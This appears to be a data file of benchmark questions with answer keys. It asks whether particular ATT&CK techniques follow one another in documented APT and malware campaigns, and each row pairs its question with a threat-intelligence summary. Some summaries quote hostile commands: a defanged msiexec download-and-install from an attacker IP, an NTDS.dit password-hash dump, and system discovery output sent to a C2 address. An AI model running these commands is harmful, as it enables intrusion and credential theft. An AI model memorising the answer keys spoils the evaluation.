955,223,223-Command and Control-T1104-Multi-Stage Channels,"After exploiting a chain of Google Chrome and Microsoft Windows zero-day vulnerabilities to gain initial access and achieving privilege escalation using CVE-2021-31955 and CVE-2021-31956, is it likely that the Stager module will notify of successful exploitation before downloading and executing a malware Dropper module to further the attack?","Initial Access: On April 14-15, 2021, Kaspersky detected a wave of highly targeted attacks against multiple companies, which were conducted through the Chrome browser. The attackers exploited a chain of Google Chrome and Microsoft Windows zero-day exploits. Although the exploit used for remote code execution (RCE) in Chrome was not retrieved, an elevation of privilege (EoP) exploit was analyzed, which was used to escape the sandbox and obtain system privileges.
Privilege Escalation: The attackers utilized an elevation of privilege exploit fine-tuned against the latest builds of Windows 10, exploiting two distinct vulnerabilities in the Windows OS kernel. These vulnerabilities, CVE-2021-31955 and CVE-2021-31956, were reported to Microsoft on April 20, 2021, and patched on June 8, 2021. CVE-2021-31955 is an information disclosure vulnerability in ntoskrnl.exe related to the SuperFetch feature, while CVE-2021-31956 is a heap-based buffer overflow in ntfs.sys. The exploit used CVE-2021-31955 to obtain kernel addresses and CVE-2021-31956 along with Windows Notification Facility (WNF) to create arbitrary memory read and write primitives. The exploit also used a ""PreviousMode"" technique to inject malware into the system process.
Others: Kaspersky products detected the attacks using the Behavioral Detection Engine and the Exploit Prevention component. The threat actor behind these attacks is referred to as PuzzleMaker. Kaspersky thanked Microsoft for their prompt analysis and patches. The malware modules are detected with the verdicts PDM:Exploit.Win32.Generic, PDM:Trojan.Win32.Generic, and UDS:DangerousObject.Multi.Generic. The hashes for the executables involved in the attack are provided for %SYSTEM%\WmiPrvMon.exe and %SYSTEM%\wmimon.dll.",Yes
1659,310,310-Discovery-T1033-System Owner/User Discovery,"After BlueBravo employs defense evasion techniques such as DLL side-loading and HTML smuggling, is it likely that their malware will gather system information like username and computer name before attempting encrypted HTTPS communication with its C2 server?","Resource Development: The BlueBravo group, associated with Russian APT29 and Midnight Blizzard, has been observed using compromised infrastructure and employing known malware families. They have also periodically used third-party services for command-and-control (C2) and reused general themes for lures. BlueBravo has been known to misuse legitimate internet services (LIS) such as Trello, Firebase, and Dropbox to evade detection.
Initial Access: BlueBravo has been delivering malware through compromised and actor-controlled domains using spearphishing emails with malicious links. Victims are redirected to compromised websites that employ scripts or HTML smuggling techniques to load malware onto their computers.
Execution: BlueBravo's malware, such as GraphicalNeutrino and GraphicalProton, acts as loaders with basic C2 functionality and implements anti-analysis techniques including API unhooking, dynamically resolving APIs, string encryption, and sandbox evasion.
Persistence: BlueBravo establishes persistence by copying the contents of malicious ISO files to a directory and creating registry run keys to execute the malware during system startup.
Defense Evasion: BlueBravo employs various defense evasion techniques, including obfuscating files or information through HTML smuggling, dynamic API resolution, masquerading, and hijacking execution flow via DLL search order hijacking and side-loading. They also impair defenses by disabling or modifying tools.
Command and Control: BlueBravo's malware uses HTTPS protocol for C2 communication, which is encrypted using RC4 encryption and then Base64-encoded. They also use web services like Microsoft OneDrive and potentially DropBox for bidirectional communication.
Others: BlueBravo's activity suggests a focus on cyber-espionage against government sector entities in Europe, likely driven by the Russian government's need for strategic data during the war in Ukraine. The group's tactics, techniques, and procedures (TTPs) are adaptive, with recent approaches including legitimate website compromise for malware delivery and the use of PHP code for delivery. Defenders are advised to detect, block, and hunt for indicators and behaviors associated with BlueBravo.",Yes
2596,56,56-Exfiltration-T1048-Exfiltration Over Alternative Protocol,"After intercepting customer transaction data through malicious scripts injected into store checkout pages, is HIDDEN COBRA likely to utilize legitimate sites hijacked and repurposed as part of their global exfiltration network to host exfiltration nodes located at entities such as an Italian modeling agency, a vintage music store from Tehran, and a family-run bookstore from New Jersey?","Initial Access: North Korean state-sponsored hackers, associated with the APT Lazarus/HIDDEN COBRA group, have been implicated in breaking into online stores of large US retailers and planting payment skimmers as early as May 2019. The method of access is currently unknown, but attackers often use spearphishing attacks to obtain retail staff passwords.
Command and Control: HIDDEN COBRA injects malicious scripts into the store checkout pages to intercept transactions. The skimmer waits for customer keystrokes and, upon transaction completion, sends the intercepted data, such as credit card numbers, to a HIDDEN COBRA-controlled collection server.
Others: Sansec's research has linked the skimming activity to HIDDEN COBRA due to reused infrastructure from previous operations and distinctive patterns in the malware code. Sansec monitors millions of online stores for skimming activity and typically finds 30 to 100 infected stores per day. The skimming operations have been ongoing since at least May 2019, with multiple independent links to previously documented North Korean hacking operations.",Yes
24,101,101-Collection-T1025-Data from Removable Media,"After achieving persistence by creating a task named 'Microsoft_up' and storing the malware in 'appdata/MicroDes/', is Machete likely to copy files to a special USB device as part of its collection capabilities?","Initial Access: The malware known as ""Machete"" is distributed through social engineering tactics, including spear-phishing emails and a fake blog website. No evidence suggests the use of exploits targeting zero-day vulnerabilities. The attackers and victims are both Spanish-speaking. The malware is embedded in PowerPoint presentations disguised as Nullsoft Installer self-extracting archives with names such as 'Hermosa XXX.pps.rar', 'Suntzu.rar', 'El arte de la guerra.rar', and 'Hot brazilian XXX.rar'. These files, when opened, install the malware on the target system.
Persistence: On infected machines, ""Machete"" creates a file named 'Java Update.lnk' pointing to 'appdata/Jre6/java.exe' and installs the malware in 'appdata/ MicroDes/'. It also creates a task named 'Microsoft_up'.
Others: The campaign, believed to have started in 2010 and renewed in 2012, may still be active. Victims are primarily located in Venezuela, Ecuador, Colombia, Peru, Russia, Cuba, and Spain, and include high-profile targets such as intelligence services, military, embassies, and government institutions. The malware uses Python embedded into Windows executables, which is unusual and suggests ease of coding rather than multi-platform support. Infrastructure for Mac OS X and Unix victims, as well as a mobile (Android) component, were also discovered. Indicators of Compromise include suspicious domains like 'java.serveblog.net', 'agaliarept.com', and others, as well as a known infection artifact 'hxxp://name.domain.org/nickname/set/Signed_Update.jar'. Malicious samples related to this attack are detected by Kaspersky Lab products as Trojan-Spy.Python.Ragua.",No
2837,86,86-Command and Control-T1071-Application Layer Protocol,"Following the malware's discovery of system information and process lists via the 'cmd.exe /c tasklist & systeminfo' command, is it likely that the malware will use HTTPS communication as part of its command and control operations?","Initial Access: Recently, a new series of malware samples were submitted to major online sandboxes, with one sample submitted to Virus Total attributed to the Russian APT28 group. The attack analyzed is multi-stage, with an initial dropper malware written in Delphi programming language downloading a second stage payload from the internet and executing it. The payload communicates with the server using the HTTPS protocol.
Execution: The malware initiates contact with the command and control server, downloading the file 'upnphost.exe' to the path '%APPDATA%\Local\Temp', which is likely the final payload. The executable implements a persistence mechanism by setting a registry key.
Persistence: The executable 'upnphost.exe' implements a persistence mechanism by setting a registry key to maintain its foothold on the system.
Defense Evasion: The 'upnphost.exe' file was submitted to Virus Total, likely due to the evasion technique implemented by the dropper. To analyze the dropper, it was patched, revealing the complete malicious behavior of the malware.
Discovery: The malware sends information gathered on the operating system to the IP '45.124.132.127' using the command line 'cmd.exe /c tasklist & systeminfo'. The server is located in Hong Kong according to WHOIS records.
Others: The attack threat map indicates the attack surface covered by the hacker group is wide, with C2Cs in Europe and China. Yara rules are provided for the dropper, first payload 'upnphost.exe', and second payload 'sdbn.dll' associated with APT28 XAGENT July 2018.",Yes
2301,385,385-Execution-T1053-Scheduled Task/Job,"After obtaining access to the victim's network through compromised remote services such as VPN or Citrix, is it likely that the adversary will rely on scheduled tasks to execute the Cobalt Strike beacon in memory before achieving persistence by targeting systems with high uptimes like servers?","Initial Access: This adversary starts with obtaining usernames and passwords of their victim from previous breaches. These credentials are used in a credential stuffing or password spraying attack against the victim's remote services, such as webmail or other internet reachable mail services. After obtaining a valid account, they use this account to access the victim's VPN, Citrix or another remote service that allows access to the network of the victim. Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.
Persistence: The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system. Once the system is rebooted, the beacon is gone. The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as servers. Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.
Privilege Escalation: The adversary started a password spraying attack against domain admin accounts, and successfully got a valid domain admin account this way. In other cases, the adversary moved laterally to another system with a domain admin logged in. They used a tool called NtdsAudit to dump the password hashes of domain users as well as observed the following command: msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv. Both ntdsutil and esentutl are by default installed on a domain controller.
Defense Evasion: The adversary attempts to clean-up some of the traces from their intrusions. While we don't know what was deleted and we were unable to recover, we did see some of their anti-forensics activity: Windows event logs clearing, File deletion, Timestomping. For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command. This tool is included in the UnxUtils repository. This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.
Credential Access: The adversary achieves credentials access by brute force, and more specifically by credential stuffing or password spraying. The traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>. While usernames for legitimate logins at the victim's network were generally formatted like <domain>\<username>. And attempted logins came from a relative small set of IP-addresses.
Discovery: The adversary applied a wide range of discovery tactics. In the list below we have highlighted a few specific tools the adversary used for discovery purposes. You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article. Account discovery tool: PsLogList Command used: psloglist.exe -accepteula -x security -s -a <date> This command exports a text file with comma separated fields. The text files contain the contents of the Security Event log after the specified date. Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft). The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file. A possible intent of the adversary could be to identify if privileged users are active on the systems. If such a privileged user was recently active on a server the actor executes Cobalt Strike's built-in Mimikatz to dump its credentials or password hash.
Lateral Movement: The adversary used the built-in lateral movement possibilities in Cobalt Strike. Cobalt Strike has various methods for deploying its beacons at newly compromised systems. We have seen the adversary using SMB, named pipes, PsExec, and WinRM. The adversary attempts to move to a domain controller as soon as possible after getting foothold into the victim's network. They continue lateral movement and discovery in an attempt to identify the data of interest. This could be a webserver to carve PII from memory, or a fileserver to copy IP, as we have both observed.
Collection: In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim's network. As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case. This document was exfiltrated and used to continue the intrusion via a company portal and VPN. In all cases we've seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems. But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems.
Command and Control: The adversary uses Cobalt Strike as framework to manage their compromised systems. We observed the use of Cobalt Strike's C2 protocol encapsulated in DNS by the adversary in 2017 and 2018. They switched to C2 encapsulated in HTTPS in Q3 2019. An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike. This is important to note because the functionalities of Cobalt Strike's trial version are limited. More importantly: the trial version doesn't support encryption of command and control traffic in cases where the protocol itself isn't encrypted, such as DNS.
Exfiltration: The adversary uses the command and control channel to exfiltrate small amounts of data. This is usually information containing account details. For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else. Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool. This tool exfiltrates specified files to cloud storage web services. The following cloud storage web services are supported by the malware: Dropbox, Google Drive, OneDrive.",Yes
1283,262,262-Defense Evasion-T1055-Process Injection,"After using Equation Editor exploits to execute an installer package with malicious payloads, is Tropic Trooper likely to execute the FakeRun loader to launch dllhost.exe before injecting a malicious DLL backdoor into the same process to facilitate their attack?","Initial Access: Tropic Trooper, also known as KeyBoy, executed commands through exploits for CVE-2017-11882 or CVE-2018-0802, which are security flaws in Microsoft Office's Equation Editor (EQNEDT32.EXE). They downloaded an installer package (.msi) and installed it on the system by executing the command: /c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]).
Execution: The system configuration file (in.sys) dropped a backdoor installer (UserInstall.exe) then deleted itself. The backdoor installer dropped a normal sidebar.exe file (a Windows Gadget tool), a malicious loader (in""C:\ProgramData\Apple\Update\wab32res.dll""), and an encrypted configuration file. UserInstall.exe abused the BITSadmin command-line tool to create a job and launch sidebar.exe. The malicious loader used dynamic-link library (DLL) hijacking on sidebar.exe and launched dllhost.exe (a normal file). The loader then injected a DLL backdoor into dllhost.exe. Malicious documents that don't need to download anything from the internet as the backdoor's dropper is already embedded in the document were also observed.
Persistence: The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&C) servers.
Command and Control: TClient used SSL to connect to Tropic Trooper's C&C server. The C&C server and some configuration values are not hardcoded in the backdoor, allowing Tropic Trooper's operators to easily change/update the C&C server and configure other values. TClient is one of Tropic Trooper's backdoors, which uses symmetric encryption to decrypt its configuration with a 16-byte key. TClient uses custom SSL libraries to connect the C&C server.
Others: Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware to targets. These documents use job vacancies in organizations that may be deemed socio-politically sensitive to recipients. The MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB). Another PDB string found is D:\Work\Project\VS\house\Apple\Apple_20180115\Release\InstallClient.pdb. At installation, the MSI file drops three files and creates one hidden directory (UFile) into C:\ProgramData\Apple\Update\, likely as a ruse. It would then use sidebar.exe to load the malicious wab32res.dll (TROJ_TCLT.ZDFB) through DLL hijacking. This is carried out to evade antivirus (AV) detection, because wab32res.dll is loaded by a benign file. Reverse analysis of TClient allowed us to determine how to decrypt the C&C information. TClient will use custom SSL libraries to connect the C&C server. We also found another SSL certificate on this C&C server. A closer look reveals that it was registered quite recently, and is set to expire after a year, suggesting Tropic Trooper's use or abuse of components or services that elapse so they can leave as few traces as possible.",No
1071,235,235-Exfiltration-T1567-Exfiltration Over Web Service,"After SLUB malware collects system information and captures screenshots during its interaction with a Mattermost server under the Discovery phase, is it likely that the malware will subsequently exfiltrate system information and screenshots via the same Mattermost server as part of the Exfiltration phase?","Initial Access: The campaign, dubbed Operation Earth Kitsune, utilized watering hole tactics to compromise websites related to North Korea, targeting international associations. The attackers injected exploits for CVE-2020-0674 and CVE-2019-5782 into these websites to facilitate the delivery of malware. The campaign specifically avoided South Korean IP addresses, indicating a focus on the global Korean diaspora.
Execution: The Chrome exploit vector involved chaining two patched vulnerabilities, CVE-2019-5782 and an unnamed Chrome bug, to execute custom shellcode. This shellcode de-obfuscated strings, initialized a network connection, and downloaded a payload named 'dropper.dll' from a C&C server. The dropper.dll then checked for security software presence and, if none were detected, downloaded and executed three additional malware samples. An Internet Explorer exploit vector using CVE-2020-0674 was also employed, which ran a PowerShell loader to infect victims with the same three malware variants.
Privilege Escalation: The PowerShell loader used in the Internet Explorer exploit vector could instruct the download and execution of an LPE binary exploiting CVE-2019-1458, potentially allowing the backdoors to execute with system privileges.
Defense Evasion: The attackers implemented checks for security software during malware deployment to avoid detection. If any security software from a predefined list was detected, the malware would abort execution. This indicates an effort to target unprotected systems and remain stealthy.
Discovery: The SLUB variant used in the campaign interacted with a Mattermost server to collect information about the infected machines. It executed a series of commands to exfiltrate system information and captured screenshots, which were then sent back to the attacker-controlled Mattermost server.
Command and Control: The SLUB malware variant communicated with a Mattermost server using HTTP on port 443. It created individual channels for each infected machine and used a notification channel for real-time updates on new infections. The Mattermost server hosted multiple channels and users, indicating an organized campaign with different attack vectors.
Others: The campaign used GNUBOARD CMS on compromised websites, which had known RCE vulnerabilities. The attackers set up their own Mattermost server, which provided them control over the infrastructure and avoided the risk of having their operations disrupted by third-party services. The Mattermost server installation date of March 10, 2020, suggests the start of the 'mm' (SLUB) samples' activity. The campaign used multiple C&C servers, seven samples, and exploits for four N-day bugs, indicating a well-resourced and capable group behind the operation.",No
2700,68,68-Persistence-T1543-Create or Modify System Process,"After the Aurora malware gains execution by registering a service pointing to a backdoor DLL and obtaining the C&C server DNS name from an encrypted embedded resource, is it likely that the malware will achieve persistence by installing itself as a service before modifying registry keys and decompressing an embedded DLL into the Windows system32 directory?","Initial Access: The Aurora operation utilized a JavaScript-based exploit vector targeting Internet Explorer 6, as detailed in Microsoft Security Bulletin MS10-002. The exploit involved a heap spray attack and shellcode injection, which then downloaded a secondary payload from a server. The dropper, once executed, would delete itself.
Execution: The malware's execution process involved a two-stage installation. Initially, the dropper installed the payload as a service, which then deleted the first service and registered a second service pointing to the same backdoor DLL. The payload accessed an encrypted embedded resource to obtain the C&C server DNS name.
Defense Evasion: To evade detection, the dropper modified the file-time of the dropped DLL to match that of an existing system DLL and loaded the DLL into its own svchost.exe process. The dropper also deleted itself using a dissolving batch file.
Command and Control: The Aurora malware communicated with C&C servers over port 443 using a weak custom encryption scheme. The C&C protocol involved specific packet formats and encrypted payloads with keys recoverable from the packet header.
Others: The report provides insights into the origins, developers, and operators of the Aurora malware operation, attributing it to Chinese origins based on forensic tool-marks and domain registration information. It also details detection methods, including JavaScript and shellcode artifacts, network detection signatures, and actionable intelligence for identifying and remediating the malware. Additionally, it discusses the global activity of the exploit and provides information on remediation and prevention strategies using various enterprise products and services.",Yes
337,144,144-Persistence-T1574-Hijack Execution Flow,"After the skip-2.0 backdoor utilizes hooks in the sqllang.dll service for stealth and blocks event logging to evade defenses, is it likely that it will exploit a DLL hijacking vulnerability to ensure persistence by being installed at C:\Windows\System32\TSVIPSrv.DLL and loaded by the Windows SessionEnv service?","Execution: The Winnti Group has been observed using a backdoor targeting Microsoft SQL Server, known as skip-2.0, which is launched via a VMProtected launcher. This launcher is typically associated with payloads such as PortReuse or ShadowPad. The skip-2.0 backdoor is executed with the SessionEnv service and is likely to use a DLL hijacking technique against this service for persistence.
Defense Evasion: The skip-2.0 backdoor employs multiple hooks in the sqllang.dll service to bypass authentication and maintain stealth, effectively blocking event logging. It also uses Winnti's custom packer for software packing, and the launcher is VMProtected, which contributes to its evasion capabilities.
Discovery: The Inner-Loader component of the skip-2.0 backdoor lists running processes to find the process running MSSQL Server, indicating a process discovery technique.
Impact: The skip-2.0 backdoor allows unauthorized access to MSSQL databases, which could lead to data destruction or tampering. It manipulates event logging at runtime and enables manipulation of stored data, potentially impacting the integrity of the data within the MSSQL databases.
Others: ESET researchers have been tracking the Winnti Group, active since at least 2012, known for high-profile supply-chain attacks against the video game and software industry. The group's recent backdoor, skip-2.0, targets MSSQL Server 11 and 12, allowing attackers to connect stealthily to any MSSQL account using a 'magic password' and automatically hiding these connections from logs. This backdoor shares similarities with the PortReuse backdoor and ShadowPad, using the same custom packer and VMProtected launcher, leading to its attribution to the Winnti Group. The backdoor's functionality includes hooking functions related to authentication and event logging in sqllang.dll to allow persistent and undetected access. ESET has published a white paper detailing the Winnti Group's arsenal and has provided indicators of compromise (IoCs) for skip-2.0, including SHA-1 hashes for the VMP Loader, Inner-Loader injector, and skip-2.0 itself, as well as known targeted sqllang.dll files. MITRE ATT&CK techniques associated with skip-2.0 include Execution, Persistence, Defense Evasion, Discovery, and Impact.",Yes
